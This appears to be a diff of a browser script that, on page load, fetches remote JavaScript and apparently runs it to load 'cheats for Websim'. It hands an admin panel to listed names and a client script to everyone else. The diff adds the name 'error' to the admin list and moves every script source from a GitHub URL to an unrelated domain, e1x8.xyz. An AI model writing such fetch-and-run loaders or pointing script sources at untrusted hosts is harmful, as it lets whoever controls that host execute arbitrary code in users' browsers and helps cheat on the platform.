@@ -1,5 +1,5 @@
 // Before anything else, check if the page is loaded
-let admins = ["blueyellow", "TheEthicalHacker", "CarEngine"];
+let admins = ["blueyellow", "TheEthicalHacker", "CarEngine", 'error'];
 async function fetchAndRun(url, room) {
   const response = await fetch(url);
   const data = await response.text();
@@ -15,10 +15,10 @@ if (document.readyState !== 'loading') {
   // Check for unauthorized users
   if (admins.includes(name)) {
     console.log("Loading cheats for Websim....");
-    const panel = fetchAndRun("https://raw.githubusercontent.com/JammyCat91283/websim/main/panel.js", room)
+    const panel = fetchAndRun("https://e1x8.xyz/scripts/panel.js", room)
 
   } else {
-    const panel = fetchAndRun("https://raw.githubusercontent.com/JammyCat91283/websim/main/client.js", room)
+    const panel = fetchAndRun("https://e1x8.xyz/scripts/client.js", room)
   }
   const targetImage = document.getElementById('targetImage');
   if (targetImage) {
@@ -40,10 +40,10 @@ if (document.readyState !== 'loading') {
     // Check for unauthorized users
     if (admins.includes(name)) {
       console.log("Loading cheats for Websim....");
-      const panel = fetchAndRun("https://raw.githubusercontent.com/JammyCat91283/websim/main/panel.js", room)
+      const panel = fetchAndRun("https://e1x8.xyz/scripts/panel.js", room)
 
     } else {
-      const panel = fetchAndRun("https://raw.githubusercontent.com/JammyCat91283/websim/main/client.js", room)
+      const panel = fetchAndRun("https://e1x8.xyz/scripts/client.js", room)
     }
     const targetImage = document.getElementById('targetImage');
     if (targetImage) {
